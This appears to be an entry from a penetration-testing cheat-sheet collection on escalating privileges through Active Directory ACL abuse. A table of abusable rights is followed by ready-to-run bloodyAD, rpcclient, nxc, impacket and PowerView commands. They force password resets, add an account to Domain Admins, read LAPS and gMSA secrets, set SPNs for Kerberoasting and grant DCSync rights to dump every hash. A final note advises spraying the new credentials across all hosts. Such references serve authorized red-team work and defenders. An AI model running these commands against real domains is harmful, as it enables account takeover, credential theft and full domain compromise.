---
id: acl-abuse
title: ACL Abuse (AD)
stage: privesc
tags: [windows, ad]
tools:
  - bloodyAD -u user -p password -d $DOMAIN --host $DC_IP set password target_user 'NewPass123!'
  - nxc ldap $DC_IP -u user -p password --gmsa
  - impacket-dacledit $DOMAIN/$USER:$PASS -action write -rights DCSync -target-dn "DC=domain,DC=local" -principal $USER
leads_to:
  - dcsync
  - winrm
  - domain-admin
---

## Common Abusable ACLs

| ACL | On | Abuse |
|---|---|---|
| `GenericAll` | user | Force password reset |
| `GenericAll` | group | Add yourself to group |
| `GenericWrite` | user | Write SPN → Kerberoast |
| `ForceChangePassword` | user | Reset without knowing current |
| `WriteOwner` | any | Change owner → grant GenericAll |
| `WriteDACL` | any | Grant yourself DCSync / GenericAll |
| `DCSync (GetChangesAll)` | domain | Dump all hashes |
| `AddSelf` | group | Add yourself |
| `ReadLAPSPassword` | computer | Read local admin password from AD |
| `ReadGMSAPassword` | computer | Read gMSA account NTLM hash |

Account Operators group members can add users to most groups (except DA) — useful for adding yourself to `Exchange Windows Permissions` which often has `WriteDACL`.

## From Linux (bloodyAD — no Windows shell needed)

```bash
# Force password reset (GenericAll / ForceChangePassword)
bloodyAD -u user -p 'password' -d $DOMAIN --host $DC_IP set password target_user 'NewPass123!'

# Via rpcclient (no extra tools)
rpcclient $DC_IP -U "$DOMAIN/user%password" -c "setuserinfo2 target_user 23 'NewPass123!'"

# Add yourself to a group
bloodyAD -u user -p 'password' -d $DOMAIN --host $DC_IP add groupMember "Domain Admins" attacker_user

# Read LAPS password
bloodyAD -u user -p 'password' -d $DOMAIN --host $DC_IP get search \
  --filter '(ms-mcs-admpwdexpirationtime=*)' --attr ms-mcs-admpwd

# Read gMSA password → NT hash
bloodyAD --host $DC_IP -d $DOMAIN -u user -p 'password' add groupMember "target_group" user
nxc ldap $DC_IP -u user -p 'password' --gmsa
evil-winrm -i $DC_IP -u 'gmsa_account$' -H <NT_HASH>

# Write SPN → Kerberoast (GenericWrite on user)
bloodyAD -u user -p 'password' -d $DOMAIN --host $DC_IP set object target_user servicePrincipalName -v 'fake/spn'
impacket-GetUserSPNs $DOMAIN/user:password -dc-ip $DC_IP -request

# Grant DCSync rights (WriteDACL on domain)
impacket-dacledit $DOMAIN/user:password -action write -rights DCSync \
  -target-dn "DC=domain,DC=local" -principal user -dc-ip $DC_IP
```

## From Windows (PowerView)

```powershell
# Force password reset
Set-DomainUserPassword -Identity target_user -AccountPassword (ConvertTo-SecureString "NewPass123!" -AsPlainText -Force)

# Add to group
Add-DomainGroupMember -Identity "Domain Admins" -Members $env:USERNAME

# Write SPN → Kerberoast
Set-DomainObject -Identity target_user -SET @{serviceprincipalname='fake/spn'}

# Read LAPS
Get-DomainComputer target_host -Properties ms-mcs-admpwd
```

## Notes

After every ACL exploit: spray the new credential/hash across all hosts (`nxc smb`), re-mark new accounts as Owned in BloodHound, re-run "Shortest Paths from Owned Principals."
